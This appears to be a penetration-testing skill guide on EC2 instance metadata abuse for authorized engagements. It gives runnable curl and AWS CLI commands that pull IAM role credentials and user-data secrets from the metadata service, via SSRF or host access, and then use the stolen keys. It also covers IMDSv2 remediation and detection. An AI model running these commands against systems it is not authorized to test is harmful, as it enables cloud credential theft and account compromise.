---
name: ec2-metadata-abuse
description: Use when you have code execution or SSRF on an EC2 instance
  on an authorized engagement and need to assess the instance metadata
  service exposure. Covers IMDSv1 versus v2, credential extraction from
  the metadata service, and user-data secrets. Use when testing SSRF,
  when you land on an EC2 host, when reviewing instance hardening, or
  when the scope includes cloud post-exploitation.
version: 1.0.0
domain: cloud
lifecycle: stable
last_verified: 2026-10-23
parent: aws-enumeration
requires: [aws-enumeration]
extends: []
relates: [cloud-security-basics, web-sqli]
tools:
  - name: curl
    version: 8.5
  - name: AWS CLI
    version: 2.15
  - name: Python
    version: 3.12
---

The EC2 instance metadata service hands out the instance's IAM role
credentials to anything that can reach it: SSRF vulnerabilities turn into
cloud credential theft through this service. This skill covers assessing
metadata exposure on authorized engagements: checking the IMDS version,
extracting what the service exposes, and understanding the credential
impact. It assumes you already have a request vector (SSRF) or host
access; finding the SSRF is the web testing phase's job.

## Quick Workflow

1. Confirm you can reach the metadata service (169.254.169.254).
2. Check whether IMDSv1 (no auth) or IMDSv2 (token required) is in use.
3. Enumerate what the service exposes: role name, credentials, user
   data.
4. Extract the role credentials where the scope allows.
5. Assess what the role grants (hand to iam-enumeration).
6. Report the IMDS version and exposure as the finding.

## 1. Version check and basic access

```bash
# IMDSv1: direct access, no token (the vulnerable configuration)
curl -s --max-time 5 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 | head -3

# IMDSv2: requires a PUT for a token first (SSRF-safe against naive GET)
TOKEN=$(curl -s --max-time 5 -X PUT \
  http://169.254.169.254/latest/api/token \
  -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' 2>&1)
echo "token: ${TOKEN:0:20}..."
curl -s --max-time 5 -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/ | head -3
```

IMDSv1 responding is the finding: any SSRF can read it with a simple
GET. IMDSv2 with hop limit 1 resists most SSRF; verify the configuration
from the instance description, not just the behavior.

```bash
# Check the instance's IMDS configuration (with EC2 read access)
aws ec2 describe-instances --instance-ids i-1234567890abcdef0 \
  --query 'Reservations[].Instances[].[MetadataOptions.HttpTokens,MetadataOptions.HttpEndpoint]' \
  --output text
# HttpTokens=required means IMDSv2 enforced: good
# HttpTokens=optional means IMDSv1 allowed: finding
```

## 2. What the service exposes

```bash
# With metadata access (on-host or via SSRF):
# Role name attached to the instance
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Temporary credentials for the role (valid ~6 hours, auto-rotated)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

# User data: often contains secrets, bootstrap credentials, scripts
curl -s http://169.254.169.254/latest/user-data | head -30
```

User data is the forgotten secret store: bootstrap scripts embed
database passwords, API keys, and private keys in plaintext, readable
by any process on the host and any SSRF. Review it on every instance
you assess.

## 3. Credential use and impact

```bash
# Use the extracted credentials (scope-approved only)
export AWS_ACCESS_KEY_ID=<from metadata>
export AWS_SECRET_ACCESS_KEY=<from metadata>
export AWS_SESSION_TOKEN=<from metadata>
aws sts get-caller-identity --output text
# Hand the session to iam-enumeration for privilege mapping

# Note the credential lifetime: metadata credentials rotate automatically,
# so exfiltrated keys have a bounded window (still hours, still enough)
```

The impact equals the role's permissions: a metadata read on an
instance with an admin role is full account compromise. That is why the
finding is about the IMDS version AND the role's privilege together;
either alone understates it.

## Edge cases

- IMDSv2 is enforced. Naive SSRF fails; the finding becomes the role
  privilege and user-data hygiene, not the metadata version.
- No IAM role attached. The metadata still exposes network and
  identity info, but no credentials; note the good configuration.
- The hop limit blocks container SSRF. IMDSv2 with hop limit 1 stops
  most container-originated SSRF; verify rather than assume.
- SSRF is blind (no response). OOB techniques still extract metadata;
  the exposure exists even when you cannot see the response directly.

## Escalation

- Credentials extracted with high privilege: report immediately and
  hand to iam-enumeration; the window is bounded by rotation.
- You need the SSRF fixed, not just reported: the fix is IMDSv2
  enforcement (HttpTokens=required) plus SSRF remediation in the app.
- Fleet-wide review needed: audit HttpTokens across all instances;
  one IMDSv1 instance in a fleet is the attacker's target.

## Detection and defender view

Defenders see metadata abuse as credential use from unusual sources:
the role's keys used outside the instance's network, or STS calls with
no matching instance activity. GuardDuty flags several of these
patterns. Defenses are IMDSv2 enforced fleet-wide, least-privilege
instance roles (so stolen credentials grant little), no secrets in
user data, and alerting on credential use anomalies.

## Key references

- MITRE ATT&CK T1552.005 (Unsecured Credentials: Cloud Instance
  Metadata API).
- CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor).
- AWS documentation: IMDSv2 and instance metadata security.
